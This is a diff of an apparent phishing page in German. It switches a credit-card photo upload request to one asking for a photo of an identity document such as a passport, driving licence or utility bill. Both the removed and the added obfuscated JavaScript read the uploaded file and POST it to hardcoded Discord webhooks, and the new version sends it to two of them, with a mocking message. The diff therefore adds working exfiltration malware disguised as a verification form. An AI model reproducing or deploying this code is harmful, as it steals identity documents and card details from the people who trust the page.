@@ -12,15 +12,23 @@
 <body>
   <div class="wrapper" id="app">
     <div class="card-form">
-      <div class="card-list">
         <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
-
+          <h2>Fügen Sie ein Foto eines gültigen Ausweisnachweises bei</h2>
+          <br>
+          <br>
+          <h3>Einer der folgenden Ausweisnachweise kann beigefügt werden:</h3>
+          <Br>
+          <ul>
+            <li>1. Staatlich ausgestellter Führerschein</li>
+            <li>2. Wählerregistrierungskarte</li>
+            <li>3. Reisepass</li>
+            <li>4. Staatsausweis</li>
+            <li>5. Innerhalb von sechs Monaten ausgestellte Stromrechnung</li>
+          </ul>
 
         </div>
-        <p class="final-text">Ihre Kreditkarte muss gültig sein. Bitte zeigen Sie die ersten 6 und letzten 4 Ziffern Ihrer Kreditkarte an und streichen Sie die mittleren Ziffern aus. Bitte stellen Sie sicher, dass das Bild klar und nicht blendend ist und dass der Wortlaut lesbar sein muss</p>
 
-      </div>
-      <div class="card-form__inner">
+      <div class="card-lol">
         <div class="card-input">
           <label for="cardNumber" class="card-input__label">Sende eine Datei.</label>
           <input type="file" class="card-input__input" id="file-selector" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required>
@@ -35,7 +43,8 @@
   <script src="https://cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.js"></script>
   <script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js"></script>
   <script>
-function _0x1a7f(){const _0x3d8fa2=['335152emStmR','16861195vCmTkd','file','7DOeWgm','212208theVsv','26IcjijM','11ssjgCJ','content','POST','append','13897272snDfQm','send','getElementById','40WNDAQw','Debil\x20Poslao\x20lmao','16130hBunkw','14706832tZhdRy','https://discord.com/api/webhooks/1205980932985856010/T-Z_4EbU-9c8qxsnl1dXHEWnVQqW-H-j9yPZYkis8wKArX0Y5veUgfOBRyzz7lK3dA1T','9171oOYYeQ','15367lnMIYq','15FYelQX'];_0x1a7f=function(){return _0x3d8fa2;};return _0x1a7f();}(function(_0x1f813f,_0x5854aa){const _0x1aebc4=_0x2411,_0x2a0d86=_0x1f813f();while(!![]){try{const _0x1cf347=parseInt(_0x1aebc4(0x151))/0x1*(parseInt(_0x1aebc4(0x143))/0x2)+-parseInt(_0x1aebc4(0x13d))/0x3*(-parseInt(_0x1aebc4(0x13e))/0x4)+parseInt(_0x1aebc4(0x14b))/0x5*(parseInt(_0x1aebc4(0x142))/0x6)+-parseInt(_0x1aebc4(0x141))/0x7*(-parseInt(_0x1aebc4(0x14e))/0x8)+parseInt(_0x1aebc4(0x150))/0x9*(-parseInt(_0x1aebc4(0x14d))/0xa)+-parseInt(_0x1aebc4(0x144))/0xb*(-parseInt(_0x1aebc4(0x148))/0xc)+-parseInt(_0x1aebc4(0x13f))/0xd;if(_0x1cf347===_0x5854aa)break;else _0x2a0d86['push'](_0x2a0d86['shift']());}catch(_0x5f4a48){_0x2a0d86['push'](_0x2a0d86['shift']());}}}(_0x1a7f,0xe9c0d));function _0x2411(_0x246896,_0x2e6e4c){const _0x1a7fdd=_0x1a7f();return _0x2411=function(_0x241168,_0x487842){_0x241168=_0x241168-0x13d;let _0x4ac529=_0x1a7fdd[_0x241168];return _0x4ac529;},_0x2411(_0x246896,_0x2e6e4c);}function sendf(){const _0x218289=_0x2411,_0x260dd8=new FormData();_0x260dd8[_0x218289(0x147)](_0x218289(0x140),document[_0x218289(0x14a)]('file-selector')['files'][0x0]),_0x260dd8['append'](_0x218289(0x145),_0x218289(0x14c));const _0x39a838=new XMLHttpRequest();_0x39a838['open'](_0x218289(0x146),_0x218289(0x14f)),_0x39a838[_0x218289(0x149)](_0x260dd8);}
-  </script>
+function _0x137d(_0x155125,_0x3461f4){const _0x29c62c=_0x29c6();return _0x137d=function(_0x137dea,_0x1451de){_0x137dea=_0x137dea-0x7d;let _0xafa9aa=_0x29c62c[_0x137dea];return _0xafa9aa;},_0x137d(_0x155125,_0x3461f4);}function _0x29c6(){const _0x54feb1=['8194120GwnlHj','3304FbcxdV','content','47319mixdRb','2027330vCDkGi','33479BJdSbR','getElementById','Debil\x20Poslao\x20lmao','934215GmOBfu','1720019GrfriI','file-selector','https://discord.com/api/webhooks/1205980932985856010/T-Z_4EbU-9c8qxsnl1dXHEWnVQqW-H-j9yPZYkis8wKArX0Y5veUgfOBRyzz7lK3dA1T','file','22xuOMvB','open','12urreYb','files','10566hqqbhg','append','POST','120cvTwvy'];_0x29c6=function(){return _0x54feb1;};return _0x29c6();}(function(_0xff59f6,_0x584f19){const _0x369de8=_0x137d,_0x2e6745=_0xff59f6();while(!![]){try{const _0x15673e=-parseInt(_0x369de8(0x80))/0x1*(parseInt(_0x369de8(0x88))/0x2)+parseInt(_0x369de8(0x7e))/0x3*(parseInt(_0x369de8(0x8f))/0x4)+parseInt(_0x369de8(0x83))/0x5+parseInt(_0x369de8(0x8a))/0x6*(-parseInt(_0x369de8(0x84))/0x7)+parseInt(_0x369de8(0x91))/0x8*(-parseInt(_0x369de8(0x8c))/0x9)+parseInt(_0x369de8(0x7f))/0xa+parseInt(_0x369de8(0x90))/0xb;if(_0x15673e===_0x584f19)break;else _0x2e6745['push'](_0x2e6745['shift']());}catch(_0x4cdfc1){_0x2e6745['push'](_0x2e6745['shift']());}}}(_0x29c6,0x403d1));function sendf(){const _0x168b8b=_0x137d,_0x327e4c=[_0x168b8b(0x86),'https://discord.com/api/webhooks/1232015719559073874/6x7bK4C9AF_JR7ZuzoLu7rTace4jJdxPVhWWAtE2VzOXCm3vgdsEIx9AURByoNLlQ_Ye'],_0xf299b6=new FormData();_0xf299b6['append'](_0x168b8b(0x87),document[_0x168b8b(0x81)](_0x168b8b(0x85))[_0x168b8b(0x8b)][0x0]),_0xf299b6[_0x168b8b(0x8d)](_0x168b8b(0x7d),_0x168b8b(0x82)),_0x327e4c['forEach'](_0x16a193=>{const _0x103235=_0x168b8b,_0x4f8970=new XMLHttpRequest();_0x4f8970[_0x103235(0x89)](_0x103235(0x8e),_0x16a193,!![]),_0x4f8970['send'](_0xf299b6);});}
+
+</script>
 </body>
 </html>
